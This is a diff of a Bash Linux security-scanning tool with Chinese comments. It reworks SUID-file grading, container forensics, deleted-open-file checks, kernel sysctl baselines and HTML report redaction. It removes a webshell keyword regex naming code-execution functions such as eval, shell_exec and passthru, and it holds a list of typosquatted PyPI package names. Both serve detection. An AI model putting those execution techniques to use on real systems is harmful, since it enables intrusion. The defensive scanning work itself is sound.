-        printf 'path\tscore\treasons\tentropy\tlong_line\tsha256\tpackage_owner\tyara\n' > "${RAW_DIR}/web-static-analysis.tsv"
-        printf '{"status":"DISABLED","profile":%s,"reason":"yara_only_mode"}\n' "$(json_quote "$SCAN_PROFILE")" > "${RAW_DIR}/static-analysis-summary.json"
-        : > "${RAW_DIR}/static-analysis.jsonl"; : > "${RAW_DIR}/binary-analysis.jsonl"
-        record_raw_status 'web-static-analysis.tsv' NOT_APPLICABLE filesystem 'yara_only_mode'
-        record_raw_status 'static-analysis.jsonl' NOT_APPLICABLE filesystem 'yara_only_mode'
-        record_raw_status 'binary-analysis.jsonl' NOT_APPLICABLE filesystem 'yara_only_mode'
     else
-        printf 'path\tscore\treasons\tentropy\tlong_line\tsha256\tpackage_owner\tyara\n' > "${RAW_DIR}/web-static-analysis.tsv"
+        printf 'path\tscore\treasons\tentropy\tlong_line\tsha256\tpackage_owner\tpipeline\n' > "${RAW_DIR}/web-static-analysis.tsv"
         printf '{"status":"DISABLED","profile":%s}\n' "$(json_quote "$SCAN_PROFILE")" > "${RAW_DIR}/static-analysis-summary.json"
-        : > "${RAW_DIR}/static-analysis.jsonl"; : > "${RAW_DIR}/binary-analysis.jsonl"; : > "${RAW_DIR}/yara-results.jsonl"
+        : > "${RAW_DIR}/static-analysis.jsonl"; : > "${RAW_DIR}/binary-analysis.jsonl"
         record_raw_status 'web-static-analysis.tsv' NOT_APPLICABLE filesystem "profile=${SCAN_PROFILE}"
         record_raw_status 'static-analysis.jsonl' NOT_APPLICABLE filesystem "profile=${SCAN_PROFILE}"
         record_raw_status 'binary-analysis.jsonl' NOT_APPLICABLE filesystem "profile=${SCAN_PROFILE}"
-        record_raw_status 'yara-results.jsonl' NOT_APPLICABLE yara "profile=${SCAN_PROFILE}"
     fi
     echo -e "${BOLD}${MAGENTA}  [07/12] 文件系统${NC}"
     echo -e "${BOLD}${MAGENTA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
@@ -6221,8 +7031,18 @@ check_filesystem() {
         return 0
     fi
     if [ "$PROFILE_DEEP_FILESYSTEM" != true ]; then
+        benchmark_stage_begin temp_executables_check
         check_lightweight_temp_executables
+        benchmark_stage_end temp_executables_check
         log_info "${SCAN_PROFILE} 已完成高价值增量文件扫描；全盘 SUID/无属主/大文件遍历仅由 full 执行"
+        return 0
+    fi
+    if ! periodic_task_due deep-filesystem; then
+        # full-diff 档：全盘 SUID/无属主/大文件遍历按 SECSCOPE_PERIODIC_DAYS 间隔执行，
+        # 日常差分轮只保留临时目录等高价值增量检查。
+        check_lightweight_temp_executables
+        log_info "全盘深扫描未到执行间隔（SECSCOPE_PERIODIC_DAYS=${SECSCOPE_PERIODIC_DAYS:-7}），本轮仅执行增量检查"
+        record_raw_status 'filesystem-deep-scan.txt' SKIPPED filesystem "interval_days=${SECSCOPE_PERIODIC_DAYS:-7};profile=${SCAN_PROFILE}"
         return 0
     fi
     collect_filesystem_global_facts /
@@ -6259,14 +7079,42 @@ check_filesystem() {
         echo "    $line ($(ls -la "$line" 2>/dev/null | awk '{print $1,$3,$4}'))"
     done
 
-    # 在临时目录或 home 目录的 SUID 文件
+    # 在临时目录或 home 目录的 SUID 文件：按位置与包归属证据分级，降低误报。
     local weird_suid=$(cat "$FILESYSTEM_WEIRD_SUID_ALL" 2>/dev/null)
     if [ -n "$weird_suid" ]; then
-        emit_find "CRITICAL" "临时目录或用户目录存在 SUID 文件" \
-            "$weird_suid" \
-            "SUID 在非系统目录是典型提权后门"
-        record_find "CRITICAL" "backdoor" "异常 SUID 文件" "$weird_suid" "立即移除" "T1548.001"
-        for f in $weird_suid; do add_ioc "File" "$f" "异常 SUID"; done
+        local suid_file suid_sev suid_conf suid_counter suid_owner suid_detail_all="" suid_count=0
+        for suid_file in $weird_suid; do
+            suid_count=$((suid_count + 1))
+            suid_owner=$(file_package_owner "$suid_file" 2>/dev/null)
+            case "$suid_file" in
+                /tmp/*|/var/tmp/*|/dev/shm/*|/run/*)
+                    suid_sev=CRITICAL; suid_conf=HIGH; suid_counter="counter_evidence=临时目录 SUID 无合法运维解释空间" ;;
+                /home/*|/root/*|/srv/*|/opt/*)
+                    if [ -n "$suid_owner" ]; then
+                        suid_sev=MEDIUM; suid_conf=LOW
+                        suid_counter="counter_evidence=包管理器归属(${suid_owner})；用户目录 SUID 属该包安装布局"
+                    else
+                        suid_sev=HIGH; suid_conf=MEDIUM
+                        suid_counter="counter_evidence=无包归属；用户自编译工具/挂载映射可解释，需人工确认"
+                    fi ;;
+                *)
+                    suid_sev=MEDIUM; suid_conf=LOW
+                    suid_counter="counter_evidence=非标准目录 SUID，待人工确认来源" ;;
+            esac
+            suid_detail_all="${suid_detail_all}${suid_detail_all:+
+}${suid_file} [${suid_sev}] owner=${suid_owner:-unowned}"
+            record_find "$suid_sev" "backdoor" "异常位置 SUID 文件: $suid_file" \
+                "path=$suid_file; owner=${suid_owner:-unowned}; $(ls -la "$suid_file" 2>/dev/null | awk '{print $1,$3,$4}')" \
+                "核实来源：确认是部署产物则移出或去 SUID 位，不明 SUID 立即隔离" "T1548.001" \
+                "FS-WEIRD-SUID" "$suid_file" "suid_sgid_files.txt" "SECURITY_ANOMALY" "$suid_conf" \
+                "SUID 出现在临时/用户目录，是本地提权后门的高价值信号" \
+                "关联最近修改时间、执行进程或恶意哈希时升级" "FILE" \
+                "$suid_counter" "$RUN_STARTED_AT|FILE|weird-suid $suid_file"
+            add_ioc "File" "$suid_file" "异常 SUID"
+        done
+        emit_find "$([ "$suid_count" -gt 0 ] && printf HIGH || printf INFO)" "临时目录或用户目录存在 SUID 文件" \
+            "$suid_detail_all" \
+            "SUID 在非系统目录是典型提权后门（已按包归属分级，详见 Finding）"
     fi
 
     # 3. 最近 7 天修改的系统文件
@@ -6290,52 +7138,12 @@ check_filesystem() {
     echo -e "\n  ${BOLD}[5] 无属主文件 (前10):${NC}"
     head -10 "$FILESYSTEM_UNOWNED_ALL" | while read -r line; do echo "    $line"; done
 
-    # 6. Web 目录 Webshell 关键字扫描
-    echo -e "\n  ${BOLD}[6] Web 目录 Webshell 关键字扫描:${NC}"
-    local web_dirs=("/var/www" "/usr/share/nginx" "/usr/local/nginx" "/home/*/www" "/home/*/html" "/opt/www")
-    local ws_keywords='eval\(|base64_decode|shell_exec|system\(|assert\(|passthru|exec\(|popen\(|proc_open|create_function|preg_replace.*\/e|`.*`'
-    local scanned=0 candidate hits extension
-    for wd in "${web_dirs[@]}"; do
-        # 展开通配符
-        for dir in $wd; do
-            if [ -d "$dir" ]; then
-                if [ "$STATIC_CANDIDATE_STATUS" != AVAILABLE ]; then
-                    mark_current_module_partial "web_keyword_candidates_${STATIC_CANDIDATE_STATUS}"
-                    continue
-                fi
-                hits=""
-                while IFS= read -r candidate; do
-                    case "$candidate" in
-                        "$dir"/*) ;;
-                        *) continue ;;
-                    esac
-                    extension="${candidate##*.}"
-                    case "$extension" in php|jsp|asp|aspx|py|pl) ;; *) continue ;; esac
-                    if grep -Iq . "$candidate" 2>/dev/null && grep -qE "$ws_keywords" "$candidate" 2>/dev/null; then
-                        hits="${hits}${hits:+$'\n'}${candidate}"
-                        [ "$(printf '%s\n' "$hits" | wc -l)" -ge 20 ] && break
-                    fi
-                done < "${STATIC_CANDIDATE_FILE:-/dev/null}"
-                if [ -n "$hits" ]; then
-                    emit_find "MEDIUM" "Web 目录发现需人工确认的关键字文件: $dir" \
-                        "$(echo "$hits" | head -5)" \
-                        "检查文件内容是否为正常业务代码或 webshell"
-                    record_find "MEDIUM" "webshell" "Web 目录关键字异常" "$hits" "检查是否为 webshell" "T1505.003" \
-                        "WEB-STATIC-KEYWORD" "$dir" "module-filesystem.log,file-inventory-current.tsv" \
-                        "SECURITY_ANOMALY" "LOW" \
-                        'eval/system/base64_decode 等函数在正常 Web 应用和依赖中也很常见，关键字命中不能证明 WebShell' \
-                        '若文件为基线新增并被 Web 进程执行、派生 Shell 或产生异常外连，应升级为安全威胁'
-                fi
-                scanned=$((scanned + 1))
-            fi
-        done
-    done
-    [ "$scanned" -eq 0 ] && log_info "未发现 Web 目录，跳过 webshell 扫描"
-
-    # 7. 大文件 — 数据打包外传
+    # 6. 大文件 — 数据打包外传
+    # （原 “Web 目录 Webshell 关键字扫描” 已移除：eval/base64_decode 等信号由
+    #   有界静态分析器 analyze-static 覆盖，逐文件重复 grep 只增加耗时。）
     local big_files=$(head -15 "$FILESYSTEM_LARGE_ALL")
     if [ -n "$big_files" ]; then
-        echo -e "\n  ${BOLD}[7] 大文件 (>200M, 非 /proc /sys):${NC}"
+        echo -e "\n  ${BOLD}[6] 大文件 (>200M, 非 /proc /sys):${NC}"
         echo "$big_files" | while read line; do
             echo "    $(du -h "$line" 2>/dev/null | awk '{print $1}')  $line"
         done
@@ -6345,6 +7153,7 @@ check_filesystem() {
     [ -n "$tmp_exe" ] && printf '%s\n' "$tmp_exe" | dump_raw "tmp_executables.txt"
     rm -f -- "$FILESYSTEM_SUID_ALL" "$FILESYSTEM_WEIRD_SUID_ALL" "$FILESYSTEM_UNOWNED_ALL" "$FILESYSTEM_LARGE_ALL" "$FILESYSTEM_RECENT_ALL" "$FILESYSTEM_PERSISTENCE_ALL"
 
+    stamp_periodic_task deep-filesystem
     log_info "文件系统检查完成"
 }
 
@@ -6569,15 +7378,50 @@ check_services() {
         fi
     fi
 
+    # v2.3 F4：容器深度取证——单次批量 docker inspect，逐容器画像
+    #（privileged/sock 挂载/宿主根挂载/PID-host/host-network/敏感 bind/
+    # entrypoint 下载链/latest 标签）。docker 缺失诚实降级 NOT_APPLICABLE。
+    if [ -x "$(command -v docker 2>/dev/null)" ] || command -v docker >/dev/null 2>&1; then
+        local cf_status
+        cf_status=$(run_with_timeout 30 python3 "$CONTAINER_FORENSICS_PATH" \
+            --out "${RAW_DIR}/container-forensics.tsv" --json-out "${RAW_DIR}/container-forensics.json" \
+            --timeout 12 2>/dev/null </dev/null | tail -1)
+        if [ -n "$cf_status" ] && printf '%s' "$cf_status" | grep -q '"finding_rows":'; then
+            record_raw_status 'container-forensics.tsv' "$([ "$(printf '%s' "$cf_status" | grep -o '"finding_rows": [0-9]*' | grep -o '[0-9]*$')" -gt 0 ] && printf SUCCESS || printf NO_RESULTS)" services "container_forensics"
+            local cf_row cf_rule cf_sev cf_cid cf_name cf_img cf_detail cf_count=0
+            while IFS=$'\t' read -r cf_cid cf_name cf_img cf_rule cf_sev cf_detail; do
+                [ -n "$cf_rule" ] || continue
+                [ "$cf_rule" = rule_id ] && continue
+                cf_count=$((cf_count + 1)); [ "$cf_count" -le 20 ] || continue
+                record_find "$cf_sev" container "容器逃逸面配置: ${cf_name}(${cf_cid}) $cf_rule" \
+                    "container=$cf_cid; name=$cf_name; image=$cf_img; rule=$cf_rule; detail=$cf_detail" \
+                    '核对容器是否业务所需；privileged/sock 挂载/宿主根挂载应收敛到最小权限' 'T1610' \
+                    "$cf_rule" "container:${cf_cid}" 'container-forensics.tsv,docker_security.txt' \
+                    'SECURITY_ANOMALY' MEDIUM \
+                    '容器运行时配置事实；是否威胁取决于镜像来源与业务意图' \
+                    '叠加异常外连、宿主敏感目录写入或挖矿进程时升级' 'CONFIG,PROCESS' \
+                    "counter_evidence=业务容器常见配置（如 CI runner 需要 privileged），需组织确认" \
+                    "$RUN_STARTED_AT|CONTAINER|$cf_rule $cf_cid"
+            done < "${RAW_DIR}/container-forensics.tsv"
+        else
+            record_raw_status 'container-forensics.tsv' PARTIAL services 'container_forensics_failed'
+        fi
+    fi
+
     # PIP 供应链检查
     echo -e "\n  ${BOLD}Python 包 (pip list 前20):${NC}"
     pip list 2>/dev/null | head -20 | while read line; do echo "    $line"; done
     pip3 list 2>/dev/null | head -20 | while read line; do echo "    $line"; done
 
     # 异常 Python 包（可能是 typo-squatting 攻击）
+    # 修复 v1.1 误报：旧正则 ^pycrypt 命中 pycryptodome、^beautifulsoup 命中
+    # beautifulsoup4、^request[^s] 命中 requests-* 插件。改为精确 typo 名单。
     if command -v pip &>/dev/null; then
-        local susp_pkgs=$(pip list 2>/dev/null | awk '{print $1}' | grep -iE '^request[^s]|^crypt[^o]|^pycrypt|^beautifulsoup|^tensorflo[^w]|^reques[t]$|^urlib|^malwares' | head -5)
-        [ -n "$susp_pkgs" ] && emit_find "MEDIUM" "可疑 Python 包名" "$susp_pkgs" "检查是否为 typo-squatting 供应链攻击" && record_find "MEDIUM" "supplychain" "可疑 PyPI 包" "$susp_pkgs" "核实包名" "T1195.002"
+        local susp_pkgs=$(pip list 2>/dev/null | awk '{print $1}' | grep -ixE 'reqests|requets|requestx|requset|urlib|tensorflo|beautifulsoup|crypt0|python-request|reques|pycrytp|crypoto|malwares' | head -5)
+        [ -n "$susp_pkgs" ] && emit_find "LOW" "可疑 Python 包名" "$susp_pkgs" "检查是否为 typo-squatting 供应链攻击" && record_find "LOW" "supplychain" "可疑 PyPI 包（疑似 typo-squatting）" "$susp_pkgs" "核实包名" "T1195.002" \
+            "" "" "" "CONFIG_BASELINE" "LOW" \
+            "已知 typo-squatting 包名精确匹配" "包名与官方库拼写差异需人工确认" "CONFIG" \
+            "counter_evidence=精确名单匹配，不误伤 pycryptodome/beautifulsoup4 等合法库" ""
     fi
 
     # 最近安装的包
@@ -6634,12 +7478,12 @@ append_normalized_event() {
     if [[ "$pid" =~ ^[0-9]+$ ]] && [ -r "/proc/${pid}/stat" ]; then
         process_instance=$(stable_linux_entity "pid=${pid}" "$exe")
     elif [[ "$pid" =~ ^[0-9]+$ ]]; then
-        process_instance="process-unresolved:$(cat /proc/sys/kernel/random/boot_id 2>/dev/null || echo unknown):${pid}:starttime-unavailable:${exe:-unknown}:${event_id}"
+        process_instance="process-unresolved:$(get_boot_id):${pid}:starttime-unavailable:${exe:-unknown}:${event_id}"
     fi
     if [[ "$ppid" =~ ^[0-9]+$ ]] && [ -r "/proc/${ppid}/stat" ]; then
         parent_instance=$(stable_linux_entity "pid=${ppid}" "parent")
     elif [[ "$ppid" =~ ^[0-9]+$ ]]; then
-        parent_instance="process-unresolved:$(cat /proc/sys/kernel/random/boot_id 2>/dev/null || echo unknown):${ppid}:starttime-unavailable:unknown:${event_id}"
+        parent_instance="process-unresolved:$(get_boot_id):${ppid}:starttime-unavailable:unknown:${event_id}"
     fi
     if [ -n "$path" ]; then file_entity=$(stable_linux_entity "$path" "$details"); fi
     if [ -n "$target" ]; then network_flow="network:${process_instance:-unknown}:$(sha256_text "$target")"; fi
@@ -6985,7 +7829,7 @@ collect_jvm_runtime_inventory() {
         jcmd_path=$(dirname "$exe")/jcmd; rc=127; tmp="${OUTPUT_DIR}/.jcmd.${pid}.$$"
         if [ -x "$jcmd_path" ]; then run_with_timeout 6 "$jcmd_path" "$pid" VM.command_line > "$tmp" 2>&1; rc=$?; fi
         printf '%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\n' \
-            "process:$(cat /proc/sys/kernel/random/boot_id 2>/dev/null || echo unknown):${pid}:${start}:${exe}" "$pid" "$start" "$user" "$exe" "${java_version:-UNAVAILABLE}" "$server_type" "$cwd" \
+            "process:$(get_boot_id):${pid}:${start}:${exe}" "$pid" "$start" "$user" "$exe" "${java_version:-UNAVAILABLE}" "$server_type" "$cwd" \
             "$(printf '%s' "$cmd" | sed -nE 's/.*(-cp|-classpath)[[:space:]]+([^[:space:]]+).*/\2/p')" \
             "$(printf '%s' "$cmd" | grep -Eo -- '-javaagent:[^ ]+|-agentlib:[^ ]+|-agentpath:[^ ]+' | tr '\n' ',')" \
             "$(tr '\n' ';' < "/proc/${pid}/cgroup" 2>/dev/null | head -c 500)" "$([ "$rc" -eq 0 ] && printf SUCCESS || printf "UNAVAILABLE_OR_EXIT_%s" "$rc")" \
@@ -7080,7 +7924,7 @@ collect_native_memory_mappings() {
         start=$(awk '{print $22}' "/proc/${pid}/stat" 2>/dev/null); [ -n "$start" ] || continue
         [ -r "/proc/${pid}/smaps" ] || { smaps_gaps=$((smaps_gaps + 1)); continue; }
         comm=$(cat "/proc/${pid}/comm" 2>/dev/null || true); exe=$(readlink "/proc/${pid}/exe" 2>/dev/null || true)
-        instance="process:$(cat /proc/sys/kernel/random/boot_id 2>/dev/null || echo unknown):${pid}:${start}:${exe}"
+        instance="process:$(get_boot_id):${pid}:${start}:${exe}"
         counter="none"; case "$comm" in java|node|dotnet|postgres|mysqld|mongod|redis-server|php-fpm*) counter="known_jit_or_runtime" ;; esac
         network=$(socket_snapshot established | grep -E "pid=${pid}," | head -3 | tr '\n' ';')
         while IFS=$'\t' read -r address perms path rss vmflags; do
@@ -7117,8 +7961,8 @@ collect_ebpf_kernel_inventory() {
         find /sys/fs/bpf -xdev -maxdepth 6 -printf '%y\t%p\n' 2>/dev/null > "${RAW_DIR}/kernel/bpf-pinned.txt" || status=PARTIAL
         record_raw_status 'kernel/bpf-prog.txt' "$status" kernel ''; record_raw_status 'kernel/bpf-map.txt' "$status" kernel ''; record_raw_status 'kernel/bpf-link.txt' "$status" kernel ''
     else
-        printf 'UNAVAILABLE: bpftool is not installed\n' > "${RAW_DIR}/kernel/bpf-unavailable.txt"
-        record_raw_status 'kernel/bpf-unavailable.txt' UNAVAILABLE kernel 'bpftool missing; user-space scan cannot exclude a kernel rootkit'
+        printf 'UNAVAILABLE: bpftool is not installed; install bpftool (apt install linux-tools-common linux-tools-$(uname -r) / yum install bpftool) to enable eBPF program inventory\n' > "${RAW_DIR}/kernel/bpf-unavailable.txt"
+        record_raw_status 'kernel/bpf-unavailable.txt' UNAVAILABLE kernel 'bpftool missing; user-space scan cannot exclude a kernel rootkit; install bpftool to close this coverage gap'
         mark_current_module_partial bpftool_unavailable
     fi
     { cat /sys/kernel/debug/tracing/enabled_functions 2>/dev/null; cat /sys/kernel/tracing/enabled_functions 2>/dev/null; } | head -5000 > "${RAW_DIR}/kernel/ftrace-enabled-functions.txt"
@@ -7133,6 +7977,69 @@ collect_ebpf_kernel_inventory() {
     record_raw_status 'kernel/modules-integrity.tsv' SUCCESS kernel ''
 }
 
+# 已删除但仍被进程持有的文件：无文件执行（memfd/临时脚本执行后删除）、日志
+# 清理（删除打开中的日志）、数据外传暂存（写入→删除→读取外传）的共同痕迹。
+# deleted-exe 已由运行时快照覆盖，这里只看普通 fd。K8s overlay 切换会产生
+# 大量已删除 fd，因此只挑临时目录路径且超过 1MB 的目标，上限 20 条。
+check_deleted_open_files() {
+    local out="${RAW_DIR}/deleted-open-files.tsv" total=0 suspicious=0
+    printf 'pid\tcomm\tpath\tsize_bytes\n' > "$out"
+    # v2.2 批处理：单进程 scandir+readlink 替代逐 fd readlink 循环
+    # （原 5000-10000 次 fork ≈ 25-60s）。契约相同，失败回退 bash 循环。
+    if command -v python3 >/dev/null 2>&1 && [ -r "$DELETED_FDS_PATH" ]; then
+        local dfs_summary
+        dfs_summary=$(run_with_timeout 60 python3 "$DELETED_FDS_PATH" --out "$out" 2>/dev/null) || dfs_summary=""
+        if printf '%s' "$dfs_summary" | grep -qE '"status":\s*"SUCCESS"'; then
+            total=$(printf '%s' "$dfs_summary" | python3 -c 'import json,sys; print(json.loads(sys.stdin.read()).get("total", 0))' 2>/dev/null || printf 0)
+            suspicious=$(printf '%s' "$dfs_summary" | python3 -c 'import json,sys; print(json.loads(sys.stdin.read()).get("suspicious", 0))' 2>/dev/null || printf 0)
+            if [ "$suspicious" -gt 0 ]; then
+                record_find "OBSERVE" "memory" "临时目录中已删除但仍被进程持有的文件: ${suspicious} 处 (>=1MB)" \
+                    "deleted_open_files=${suspicious}; total_deleted_fds_tmp=${total}; 明细见 deleted-open-files.tsv" \
+                    '结合进程命令行、文件时间线与外连判断是否为无文件执行/日志清理/数据暂存痕迹' 'T1070.004' \
+                    'MEM-DELETED-OPEN-FILE' 'deleted-open-files' 'deleted-open-files.tsv,runtime-snapshot-final.jsonl' \
+                    'SECURITY_ANOMALY' 'LOW' \
+                    '已删除仍打开的临时目录文件常见于应用临时缓冲；结合持有进程身份与行为研判' \
+                    '若持有进程为新出现/无包归属/伴随外连，或文件内容为脚本与凭据，应升级' 'FILE,MEMORY' \
+                    '反证：容器 overlay 切换会产生大量已删除 fd，仅统计临时目录且 >=1MB 目标'
+            fi
+            record_raw_status 'deleted-open-files.tsv' "$([ "$suspicious" -gt 0 ] && printf SUCCESS || printf NO_RESULTS)" memory "suspicious=${suspicious};total=${total}"
+            return 0
+        fi
+        mark_current_module_partial deleted_fds_batch_failed_fallback_bash
+    fi
+    local pid fd target size comm
+    for pid in $(ls /proc 2>/dev/null | grep -E '^[0-9]+$' | head -2000); do
+        [ -r "/proc/$pid/fd" ] || continue
+        comm=$(cat "/proc/$pid/comm" 2>/dev/null); comm=${comm:-unknown}
+        for fd in /proc/$pid/fd/*; do
+            target=$(readlink "$fd" 2>/dev/null) || continue
+            case "$target" in *"(deleted)") ;; *) continue ;; esac
+            case "$target" in
+                /tmp/*|/var/tmp/*|/dev/shm/*) ;;
+                *) continue ;;
+            esac
+            total=$((total + 1))
+            size=$(stat -c %s -- "${target% (deleted)}" 2>/dev/null || stat -Lc %s -- "/proc/$pid/fd/$(basename "$fd")" 2>/dev/null || echo 0)
+            case "$size" in ''|*[!0-9]*) size=0 ;; esac
+            [ "$size" -ge 1048576 ] || continue
+            suspicious=$((suspicious + 1))
+            [ "$suspicious" -le 20 ] || continue
+            printf '%s\t%s\t%s\t%s\n' "$pid" "$comm" "$target" "$size" >> "$out"
+        done
+    done
+    if [ "$suspicious" -gt 0 ]; then
+        record_find "OBSERVE" "memory" "临时目录中已删除但仍被进程持有的文件: ${suspicious} 处 (>=1MB)" \
+            "deleted_open_files=${suspicious}; total_deleted_fds_tmp=${total}; 明细见 deleted-open-files.tsv" \
+            '结合进程命令行、文件时间线与外连判断是否为无文件执行/日志清理/数据暂存痕迹' 'T1070.004' \
+            'MEM-DELETED-OPEN-FILE' 'deleted-open-files' 'deleted-open-files.tsv,runtime-snapshot-final.jsonl' \
+            'SECURITY_ANOMALY' 'LOW' \
+            '已删除仍打开的临时目录文件常见于应用临时缓冲；结合持有进程身份与行为研判' \
+            '若持有进程为新出现/无包归属/伴随外连，或文件内容为脚本与凭据，应升级' 'FILE,MEMORY' \
+            '反证：容器 overlay 切换会产生大量已删除 fd，仅统计临时目录且 >=1MB 目标'
+    fi
+    record_raw_status 'deleted-open-files.tsv' "$([ "$suspicious" -gt 0 ] && printf SUCCESS || printf NO_RESULTS)" memory "suspicious=${suspicious};total=${total}"
+}
+
 check_memory() {
     echo ""
     echo -e "${BOLD}${MAGENTA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
@@ -7143,6 +8050,7 @@ check_memory() {
     collect_jvm_runtime_inventory
     collect_php_runtime_inventory
     collect_native_memory_mappings
+    check_deleted_open_files
 
     # /proc/sys/kernel/tainted
     local taint=$(cat /proc/sys/kernel/tainted 2>/dev/null)
@@ -7507,6 +8415,44 @@ check_patterns() {
 # 12 — 配置安全基线
 #==============================================================================
 
+# 内核安全暴露面 sysctl：只挑与入侵对抗直接相关的键，缺省值不告警，
+# 危险值（可被利用弱化防护）记 OBSERVE——容器内常见，降噪交给判断依据。
+collect_sysctl_security_baseline() {
+    local out="${RAW_DIR}/sysctl-security.txt"
+    : > "$out"
+    local key value
+    for key in kernel.kptr_restrict kernel.dmesg_restrict kernel.yama.ptrace_scope \
+               kernel.randomize_va_space kernel.unprivileged_bpf_disabled kernel.kexec_load_disabled \
+               vm.mmap_min_addr fs.protected_hardlinks fs.protected_symlinks fs.protected_fifos \
+               fs.protected_regular fs.suid_dumpable net.ipv4.conf.all.rp_filter \
+               net.ipv4.conf.all.accept_redirects net.ipv4.conf.all.send_redirects \
+               net.ipv4.conf.all.accept_source_route kernel.modules_disabled; do
+        value=$(sysctl -n "$key" 2>/dev/null); [ -n "$value" ] || value=unavailable
+        printf '%s=%s\n' "$key" "$value" >> "$out"
+    done
+    record_raw_status 'sysctl-security.txt' SUCCESS baseline ''
+    local kptr yama aslr mmap
+    kptr=$(grep -oP '(?<=kernel.kptr_restrict=)[0-9]+' "$out" | head -1)
+    yama=$(grep -oP '(?<=kernel.yama.ptrace_scope=)[0-9]+' "$out" | head -1)
+    aslr=$(grep -oP '(?<=kernel.randomize_va_space=)[0-9]+' "$out" | head -1)
+    mmap=$(grep -oP '(?<=vm.mmap_min_addr=)[0-9]+' "$out" | head -1)
+    if [ "${kptr:-1}" = "0" ] || [ "${yama:-2}" = "0" ] || [ "${aslr:-2}" = "0" ] || [ "${mmap:-65536}" = "0" ]; then
+        local weak=""
+        [ "${kptr:-1}" = "0" ] && weak="${weak}kptr_restrict=0(内核指针泄露) "
+        [ "${yama:-2}" = "0" ] && weak="${weak}ptrace_scope=0(任意进程可 ptrace) "
+        [ "${aslr:-2}" = "0" ] && weak="${weak}randomize_va_space=0(ASLR 关闭) "
+        [ "${mmap:-65536}" = "0" ] && weak="${weak}mmap_min_addr=0(null 指针解引用可映射) "
+        record_find "OBSERVE" "baseline" "内核安全 sysctl 存在弱化配置" \
+            "${weak%; }" \
+            '按业务是否受容器平台约束评估收紧 kptr_restrict/ptrace_scope/ASLR' '' \
+            'BAS-SYSCTL-WEAK' 'sysctl-security' 'sysctl-security.txt' \
+            'SECURITY_ANOMALY' 'LOW' \
+            '这些开关默认被容器运行时放宽；仅当宿主承载不可信工作负载时按 HIGH 处置' \
+            '若与无包归属进程、注入类发现同时出现，应升级' 'CONFIG,INTEGRITY' \
+            '反证：容器/K8s 节点常用放宽值，单独出现不构成入侵证据'
+    fi
+}
+
 check_baseline() {
     echo ""
     echo -e "${BOLD}${MAGENTA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
@@ -7617,7 +8563,7 @@ check_baseline() {
 # HTML 可视化报告
 #==============================================================================
 
-generate_html_report() {
+generate_html_report_legacy() {
     local verdict="$1"
     local total=$((SEVERITY_CRITICAL + SEVERITY_HIGH + SEVERITY_MEDIUM + SEVERITY_LOW))
 
@@ -7709,6 +8655,18 @@ generate_html_report() {
     local threat_critical=0 threat_high=0 threat_medium=0 threat_low=0
     local base_critical=0 base_high=0 base_medium=0 base_low=0
     local change_shown=0 idx
+    # 证据+攻击链时间线的脱敏一次性批量完成，替代循环内每条 finding 一次 perl。
+    local -a HTML_REDACTED=()
+    if [ "${#FINDINGS[@]}" -gt 0 ]; then
+        local h_idx h_text h_rec
+        while IFS= read -r -d $'\0' h_rec; do HTML_REDACTED+=("$h_rec"); done < <(
+            for h_idx in "${!FINDINGS[@]}"; do
+                h_text="${FINDING_EVIDENCES[$h_idx]}"
+                [ -n "${FINDING_TIMELINES[$h_idx]:-}" ] && h_text="${h_text}"$'\n--- 攻击链时间线 ---\n'"${FINDING_TIMELINES[$h_idx]}"
+                printf '%s\0' "$h_text"
+            done | redact_batch_stream
+        )
+    fi
     while IFS= read -r idx; do
         [ -n "$idx" ] || continue
         local sev="${FINDING_SEVS[$idx]}"
@@ -7741,14 +8699,14 @@ generate_html_report() {
         local sum_short="$sum"
         [ "${#sum_short}" -gt 80 ] && sum_short="${sum_short:0:80}..."
         sum_short=$(html_esc "$sum_short")
-        evd=$(html_esc "$(redact_text "${evd}${finding_timeline:+$'\n--- 攻击链时间线 ---\n'}${finding_timeline}")")
+        evd=$(html_esc "${HTML_REDACTED[$idx]:-$(redact_text "${evd}${finding_timeline:+$'\n--- 攻击链时间线 ---\n'}${finding_timeline}")}")
         rec=$(html_esc "$rec")
 
         local row_html search_text severity_key
-        severity_key=$(printf '%s' "$sev" | tr '[:upper:]' '[:lower:]')
+        severity_key="${sev,,}"
         search_text=$(html_esc "$sev $confidence $finding_type $lifecycle $sum ${FINDING_RULE_IDS[$idx]} ${FINDING_MODULES[$idx]} $cat")
         local evidence_id="evidence-${idx}"
-        row_html="$(printf '<tr class="row-%s finding-row" data-search-item="1" data-section="%s" data-severity="%s" data-confidence="%s" data-search="%s"><td class="col-sev"><span class="tag tag-%s">%s</span></td><td class="col-sum"><span class="life">%s</span> %s</td><td><span class="confidence confidence-%s">%s可信</span></td><td class="col-cat"><span class="cat-label cat-%s">%s</span></td><td class="col-act"><button type="button" class="evidence-toggle" data-target="%s">查看证据</button></td></tr><tr id="%s" class="evidence-row" hidden><td colspan="5"><div class="evidence-layout"><div><div class="dp-label">证据</div><pre>%s</pre><div class="dp-label">判断依据</div><p>%s</p><div class="dp-label">升级条件</div><p>%s</p></div><div><div class="dp-label">处置建议</div><p>%s</p><div class="dp-label">规则 / 指纹</div><code>%s / %s</code><div class="dp-label">首次 / 最近 / 次数</div><code>%s / %s / %s</code><div class="dp-label">模块 / MITRE</div><code>%s / %s</code><div class="dp-label">相关原始数据</div><span class="raw-ref">%s</span></div></div></td></tr>' "$cls" "$section" "$severity_key" "$(printf '%s' "$confidence" | tr '[:upper:]' '[:lower:]')" "$search_text" "$cls" "$lbl" "$(html_esc "$(lifecycle_label "$lifecycle")")" "$sum_short" "$(printf '%s' "$confidence" | tr '[:upper:]' '[:lower:]')" "$(html_esc "$(confidence_label "$confidence")")" "$cat" "$clabel" "$evidence_id" "$evidence_id" "$evd" "$(html_esc "$judgment_basis")" "$(html_esc "$escalation_conditions")" "$rec" "$(html_esc "${FINDING_RULE_IDS[$idx]}")" "$(html_esc "${FINDING_FINGERPRINTS[$idx]:0:16}")" "$(html_esc "${FINDING_FIRST_SEEN[$idx]}")" "$(html_esc "${FINDING_LAST_SEEN[$idx]}")" "${FINDING_OCCURRENCES[$idx]}" "$(html_esc "${FINDING_MODULES[$idx]}")" 